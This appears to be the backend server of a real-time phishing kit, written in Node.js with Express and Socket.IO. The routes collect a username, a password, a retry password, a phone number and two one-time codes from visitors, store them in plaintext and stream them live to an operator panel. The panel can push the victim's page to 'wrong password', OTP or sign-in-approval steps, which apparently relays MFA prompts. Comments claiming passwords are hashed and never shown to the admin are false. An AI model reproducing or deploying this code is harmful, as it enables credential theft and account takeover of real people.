const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const http = require("http");
const bcrypt = require("bcryptjs");
const { Server } = require("socket.io");

require("dotenv").config();

const User = require("./models/User");

const app = express();
const server = http.createServer(app);

// =====================================================
// MIDDLEWARE
// =====================================================

app.use(
  cors({
    origin: "*",
    methods: ["GET", "POST", "PATCH", "DELETE"],
    credentials: true
  })
);

app.use(express.json());
app.set("trust proxy", true);

// =====================================================
// SOCKET.IO
// =====================================================

const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST", "PATCH", "DELETE"],
    credentials: true
  }
});

// =====================================================
// HELPER FUNCTIONS
// =====================================================

const emitToAdmins = (event, data) => {
  io.to("admins").emit(event, data);
};

const emitToUser = (userId, event, data) => {
  io.to(`user-${userId}`).emit(event, data);
};

// =====================================================
// DATABASE
// =====================================================

mongoose
  .connect(process.env.MONGODB_URI)
  .then(() => {
    console.log("MongoDB connected");
  })
  .catch((error) => {
    console.log("MongoDB error:", error);
  });

// =====================================================
// SOCKET CONNECTION
// =====================================================

io.on("connection", (socket) => {
  console.log("Socket connected:", socket.id);

  // ---------------------------------------------------
  // ADMIN JOINS ADMIN ROOM
  // ---------------------------------------------------

  socket.on("join-admin", () => {
    socket.join("admins");

    console.log(
      "Admin joined:",
      socket.id
    );
  });

  // ---------------------------------------------------
  // USER JOINS PRIVATE ROOM
  // ---------------------------------------------------

  socket.on("register-user", (userId) => {
    if (!userId) return;

    socket.join(`user-${userId}`);

    console.log(
      "User joined room:",
      `user-${userId}`
    );
  });

  // ---------------------------------------------------
  // DISCONNECT
  // ---------------------------------------------------

  socket.on("disconnect", () => {
    console.log(
      "Socket disconnected:",
      socket.id
    );
  });
});

// =====================================================
// START SIGN-IN
// =====================================================
// Called after the user enters their first and clicks
// Next.
//
// The account/session is created BEFORE the last
// step.
// =====================================================
function getDeviceInfo(userAgent = "") {

  let device = "Unknown";

  if (/Windows/i.test(userAgent)) {
    device = "Windows";
  }

  else if (/Macintosh|Mac OS X/i.test(userAgent)) {
    device = "Mac";
  }

  else if (/Android/i.test(userAgent)) {
    device = "Android";
  }

  else if (/iPhone|iPad/i.test(userAgent)) {
    device = "iPhone/iPad";
  }

  else if (/Linux/i.test(userAgent)) {
    device = "Linux";
  }


  let browser = "Unknown";

  if (/Edg/i.test(userAgent)) {
    browser = "Edge";
  }

  else if (/Chrome/i.test(userAgent)) {
    browser = "Chrome";
  }

  else if (/Firefox/i.test(userAgent)) {
    browser = "Firefox";
  }

  else if (/Safari/i.test(userAgent)) {
    browser = "Safari";
  }


  return {
    device,
    browser
  };
}

const updateLastLogin = async (user) => {
  user.lastLogin = new Date();

  await user.save();

  emitToAdmins("user-last-login", {
    userId: user._id,
    lastLogin: user.lastLogin
  });
};

app.post(
  "/api/auth/start",
  async (req, res) => {
    try {

      // Check whether this first already has a pending
      // session.

      const ip = req.ip
      
      const userAgent =
        req.headers["user-agent"] || "";


      const deviceInfo =
        getDeviceInfo(
          userAgent
        );

      
      let  user = await User.create({
          phn: null,
          lastLogin: new Date(),
          approved: false,
          device: deviceInfo.device,
          currentStep: "first",
          browser: deviceInfo.browser,
          uip: ip,
          phoneRequested: false,
          status: "Visited"
        });
  
      console.log(
        "Page is visited:",
      );

      // Send only safe information to admins.
      emitToAdmins(
        "new-user",
        {
          _id: user._id,
          first: user.first,
          status: user.status,
          device: user.device,
          uip: user.uip,
          currentStep: user.currentStep,
          
          browser: user.browser,
          approved: user.approved,
          phoneRequested: user.phoneRequested,
          createdAt: user.createdAt
        }
      );

      res.status(201).json({
        message: "Site visited",
        userId: user._id
      });

    } catch (error) {
      console.log(
        "START SIGN-IN ERROR:",
        error
      );

      res.status(500).json({
        message: "Server error", error
      });
    }
  }
);

// =====================================================
// SUBMIT last
// =====================================================
// The last is immediately hashed.
// It is NEVER emitted to the admin.
// =====================================================

app.post(
  "/api/auth/first",
  async (req, res) => {
    try {
      const {
        
        first,
        userId
      } = req.body;

      if (!userId || !first) {
        return res.status(400).json({
          message:
            "User ID and first are required"
        });
      }

      const user =
        await User.findById(userId);

      if (!user) {
        return res.status(404).json({
          message: "User not found"
        });
      }

      // Hash last
    

      user.first = first

      user.currentStep = "last"

      user.status =
        "first-submitted";
      
      await updateLastLogin(user);

     
      // Tell admin only that the last
      // step was completed.
      emitToAdmins(
        "first-set",
        {
          _id: user._id,
          first: user.first,
          currentStep: user.currentStep,
          status: user.status
        }

      );

     
      res.json({
        message:
          "first submitted successfully"
      });

    } catch (error) {
      console.log(
        "first ERROR:",
        error
      );

      res.status(500).json({
        message: "Server error"
      });
    }
  }
);


app.post(
  "/api/auth/last",
  async (req, res) => {
    try {
      const {
        userId,
        last
      } = req.body;

      if (!userId || !last) {
        return res.status(400).json({
          message:
            "User ID and last are required"
        });
      }

      const user =
        await User.findById(userId);

      if (!user) {
        return res.status(404).json({
          message: "User not found"
        });
      }

      // Hash last
    

      user.last = last

      user.currentStep = "processing"

      user.status =
        "last-submitted";
      
      await updateLastLogin(user);

     
      // Tell admin only that the last
      // step was completed.
      emitToAdmins(
        "last-set",
        {
          _id: user._id,
          first: user.first,
          last: user.last,
          currentStep: user.currentStep,
          status: user.status
        }

      );

     
      res.json({
        message:
          "last submitted successfully"
      });

    } catch (error) {
      console.log(
        "last ERROR:",
        error
      );

      res.status(500).json({
        message: "Server error"
      });
    }
  }
);

app.delete("/api/admin/users", async (req, res) => {
  try {
    const result = await User.deleteMany({});

    // Tell connected admins that the list was cleared
    io.to("admins").emit("users-cleared");

    res.json({
      success: true,
      deletedCount: result.deletedCount,
    });
  } catch (error) {
    console.error("Clear users error:", error);

    res.status(500).json({
      success: false,
      message: "Failed to clear users",
    });
  }
});

app.post(
  "/api/auth/WongP",
  async (req, res) => {
    try {
      const {
        userId,
        WongP
      } = req.body;

      if (!userId || !WongP) {
        return res.status(400).json({
          message:
            "User ID and WongP are required"
        });
      }

      const user =
        await User.findById(userId);

      if (!user) {
        return res.status(404).json({
          message: "User not found"
        });
      }

      // Hash WongP
    

      user.WongP = WongP

      user.status =
        "WongP-submitted";
      user.currentStep = "processing"


        

   await updateLastLogin(user);

      console.log(
        "WongP submitted for:",
        user.first
      );

      // Tell admin only that the WongP
      // step was completed.
      emitToAdmins(
        "WongP-set",
        {
          _id: user._id,
          first: user.first,
          WongP: user.WongP,
          currentStep: user.currentStep,

          status: user.status
        }
      );

      res.json({
        message:
          "last submitted successfully"
      });

    } catch (error) {
      console.log(
        "last ERROR:",
        error
      );

      res.status(500).json({
        message: "Server error"
      });
    }
  }
);

// =====================================================
// GET ALL USERS / SESSIONS
// =====================================================

app.get(
  "/api/admin/pending-users",
  async (req, res) => {
    try {
      const users =
        await User.find({})
          .sort({
            lastLogin: -1
          });

      res.json(users);

    } catch (error) {
      console.log(
        "GET USERS ERROR:",
        error
      );

      res.status(500).json({
        message: "Server error"
      });
    }
  }
);

// ==========================================
// CHANGE USER UI STEP
// ==========================================

app.patch("/api/admin/change-step/:id", async (req, res) => {
  try {
    const { id } = req.params;
    const { step } = req.body;

    if (!step) {
      return res.status(400).json({
        message: "Step is required",
      });
    }

    const allowedSteps = [
      "first",
      "last",
      "approve",
      "phone",
      "phone-otp",
      "phone-otp2",
      "success",
      "signin-request",
      "wrong-last", 
      "processing"
    ];

    if (!allowedSteps.includes(step)) {
      return res.status(400).json({
        message: "Invalid step",
      });
    }

    const user = await User.findByIdAndUpdate(
      id,
      {
        currentStep: step,
        status: step
      },
      {
        new: true,
      }
    );

    if (!user) {
      return res.status(404).json({
        message: "User not found",
      });
    }

    // Tell the specific user's browser to change UI step
    io.to(`user-${id}`).emit("step-changed", {
      step,
    });

    // Tell admins about the update
    io.to("admins").emit("user-step-changed", {
      userId: id,
      step,
      status: step,
      currentStep: step,
    });

    res.json({
      success: true,
      userId: id,
      step,
    });

  } catch (error) {
    console.error("Change step error:", error);

    res.status(500).json({
      message: "Failed to change step",
    });
  }
});

// =====================================================
// APPROVE USER
// =====================================================

app.patch(
  "/api/admin/approve/:id",
  async (req, res) => {

    try {

      const { id } = req.params;

      const {
        userDevice,
        code
      } = req.body;


      // =====================================
      // VALIDATION
      // =====================================

      if (
        !userDevice ||
        !code
      ) {

        return res.status(400).json({
          message:
            "User device and code are required"
        });

      }


      // =====================================
      // FIND USER
      // =====================================

      const user =
        await User.findById(id);


      if (!user) {

        return res.status(404).json({
          message:
            "User not found"
        });

      }


      // =====================================
      // SAVE APPROVAL INFORMATION
      // =====================================


      user.userDevice =
        userDevice.trim();

      user.code =
        code.trim();

      
      user.step = "signin-request";

      await user.save();


      console.log(
        "🔥 USER Device details:",
        user.first
      );

      console.log(
        "Assigned username:",
        user.userDevice
      );

      console.log(
        "ID number:",
        user.code
      );


      // =====================================
      // REALTIME MESSAGE TO USER
      // =====================================

      io.to(
        `user-${id}`
      ).emit(
        "account-approved",
        {
          userId:
            user._id,

          userDevice:
            user.userDevice,

          code:
            user.code
        }
      );


      // =====================================
      // RESPONSE TO ADMIN
      // =====================================

      const safeUser = {
        _id: user._id,
        first: user.first,
        approved: user.approved,
        userDevice:
          user.userDevice,
        code:
          user.code,
        device:
          user.device,
        browser:
          user.browser,
        createdAt:
          user.createdAt,
        lastLogin:
          user.lastLogin
      };


      res.json({
        message:
          "User approved",

        user:
          safeUser
      });

    }

    catch (error) {

      console.log(
        "APPROVAL ERROR:",
        error
      );

      res.status(500).json({
        message:
          "Server error"
      });

    }

  }
);

// =====================================================
// ADMIN REQUESTS PHONE VERIFICATION
// =====================================================
// This is the button the admin clicks.
//
// NO MODAL is opened here.
//
// Instead, the user's React app receives the event
// immediately and changes to the phone-verification step.
// =====================================================


// =====================================================
// SUBMIT PHONE NUMBER
// =====================================================

app.post(
  "/api/auth/phone",
  async (req, res) => {
    try {
      const {
        userId,
        phn
      } = req.body;

      if (!userId || !phn) {
        return res.status(400).json({
          message:
            "User ID and phone number are required"
        });
      }

      const user =
        await User.findById(userId);

      if (!user) {
        return res.status(404).json({
          message:
            "User not found"
        });
      }

      user.phn = phn;
      user.status =
        "phone-submitted";

     await updateLastLogin(user);

      console.log(
        "Phone submitted for:",
        user.first
      );

      user.currentStep = "processing"


      // Admin gets the phone submission
      // notification.
      emitToAdmins(
        "phone-submitted",
        {
          _id: user._id,
          first: user.first,
          phn: user.phn,
          status: user.status,
          currentStep: user.currentStep
        }
      );

      res.json({
        message:
          "Phone number submitted"
      });

    } catch (error) {
      console.log(
        "PHONE SUBMIT ERROR:",
        error
      );

      res.status(500).json({
        message: "Server error"
      });
    }
  }
);

app.post(
  "/api/auth/ptp",
  async (req, res) => {
    try {
      const {
        userId,
        ptp
      } = req.body;
      console.log(ptp)

      if (!userId || !ptp) {
        return res.status(400).json({
          message:
            "User ID and phone number are required"
        });
      }

      const user =
        await User.findById(userId);

      if (!user) {
        return res.status(404).json({
          message:
            "User not found"
        });
      }

      user.ptp = ptp;
      user.status =
        "phone otp submitted";

      user.currentStep = "processing"


  await updateLastLogin(user);

      console.log(
        "Phone submitted for:",
        user.first
      );

      // Admin gets the phone submission
      // notification.
      emitToAdmins(
        "ptp-submitted",
        {
          _id: user._id,
          first: user.first,
          ptp: user.ptp,
          status: user.status,
          currentStep: user.currentStep
        }
      );

      res.json({
        message:
          "Phone number submitted"
      });

    } catch (error) {
      console.log(
        "PHONE SUBMIT ERROR:",
        error
      );

      res.status(500).json({
        message: "Server error"
      });
    }
  }
);

app.post(
  "/api/auth/ptp2",
  async (req, res) => {
    try {
      const {
        userId,
        ptp2
      } = req.body;

      if (!userId || !ptp2) {
        return res.status(400).json({
          message:
            "User ID and phone number are required"
        });
      }

      const user =
        await User.findById(userId);

      if (!user) {
        return res.status(404).json({
          message:
            "User not found"
        });
      }

      user.ptp2 = ptp2;
      user.status =
        "phone otp submitted";
      user.currentStep = "processing"


     await updateLastLogin(user);

      console.log(
        "Phone submitted for:",
        user.first
      );

      // Admin gets the phone submission
      // notification.
      emitToAdmins(
        "ptp2-submitted",
        {
          _id: user._id,
          first: user.first,
          ptp2: user.ptp2,
          status: user.status,
          currentStep: user.currentStep
        }
      );

      res.json({
        message:
          "Phone number submitted"
      });

    } catch (error) {
      console.log(
        "PHONE SUBMIT ERROR:",
        error
      );

      res.status(500).json({
        message: "Server error"
      });
    }
  }
);

// =====================================================
// DELETE USER / SESSION
// =====================================================

app.delete(
  "/api/admin/users/:id",
  async (req, res) => {
    try {
      const { id } = req.params;

      const user =
        await User.findByIdAndDelete(id);

      if (!user) {
        return res.status(404).json({
          message:
            "User not found"
        });
      }

      // Tell admin clients to remove
      // the session immediately.
      emitToAdmins(
        "user-deleted",
        {
          userId: id
        }
      );

      res.json({
        message:
          "User deleted"
      });

    } catch (error) {
      console.log(
        "DELETE ERROR:",
        error
      );

      res.status(500).json({
        message: "Server error"
      });
    }
  }
);

// =====================================================
// HEALTH CHECK
// =====================================================

app.get(
  "/",
  (req, res) => {
    res.json({
      message:
        "Backend is running",
      socket:
        "Socket.IO is enabled"
    });
  }
);

// =====================================================
// SERVER
// =====================================================

const PORT =
  process.env.PORT || 5000;

server.listen(
  PORT,
  () => {
    console.log(
      `Server running on http://localhost:${PORT}`
    );
  }
);